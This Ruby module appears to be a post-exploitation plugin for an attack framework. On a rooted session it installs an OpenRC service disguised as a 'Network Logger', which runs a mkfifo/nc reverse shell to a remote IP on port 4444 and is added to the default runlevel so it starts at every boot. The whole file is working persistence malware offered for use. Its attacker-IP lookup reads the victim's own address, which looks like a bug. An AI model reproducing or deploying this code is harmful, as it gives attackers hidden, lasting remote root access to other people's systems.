module OpenrcReverseShell
  def self.run(fm, sid, client)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping OpenRC service.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end

    svc_name = "netlogger"
    init_script = "/etc/init.d/#{svc_name}"

    client.print_good("Session #{sid} is root. Deploying OpenRC reverse shell...")

    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
    attacker_port = 4444

    # Evitar duplicação
    if session.shell_command_token("test -f #{init_script} && echo 'EXISTS'").include?('EXISTS')
      client.print_status("OpenRC service already exists. Skipping.")
      return
    end

    # Script de init compatível com OpenRC (baseado no esqueleto de /etc/init.d/skeleton)
    init_content = <<~OPENRC
      #!/sbin/openrc-run

      name="Network Logger"
      command="/bin/sh"
      command_args="-c 'rm -f /tmp/.o; mkfifo /tmp/.o; /bin/sh -i < /tmp/.o 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.o'"
      pidfile="/var/run/${RC_SVCNAME}.pid"
      supervise_daemon_args="--stdout-logfile /var/log/${RC_SVCNAME}.log"

      depend() {
          need net
          after firewall
      }
    OPENRC

    write_cmd = <<~SHELL
      cat > '#{init_script}' << 'EOF'
      #{init_content}
      EOF
      chmod +x '#{init_script}'
      rc-update add #{svc_name} default 2>/dev/null
      rc-service #{svc_name} start 2>/dev/null
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("OpenRC reverse shell deployed and added to default runlevel!")
    rescue => e
      client.print_error("Failed to deploy OpenRC service: #{e.message}")
    end
  end
end
